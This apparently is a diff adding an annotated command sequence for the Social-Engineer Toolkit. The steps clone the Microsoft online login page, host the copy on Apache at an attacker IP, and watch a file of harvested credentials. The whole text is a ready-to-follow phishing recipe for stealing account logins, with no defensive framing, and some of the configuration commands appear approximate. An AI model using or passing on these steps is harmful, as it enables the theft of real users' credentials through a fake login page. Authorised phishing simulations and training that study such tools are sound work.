@@ -1,0 +1,10 @@
+setoolkit                                      # Launch SET
+1                                              # Select Social-Engineering Attacks
+2                                              # Website Attack Vectors
+3                                              # Credential Harvester Attack
+2                                              # Site Cloner
+Enter URL: https://login.microsoftonline.com   # Target site to clone
+set Apache ON                                  # Use Apache for hosting
+set IP 192.168.1.5                              # Set attacker's IP for redirection
+start Apache                                   # Start Apache server
+tail -f /var/www/html/harvester.txt            # Monitor harvested credentials
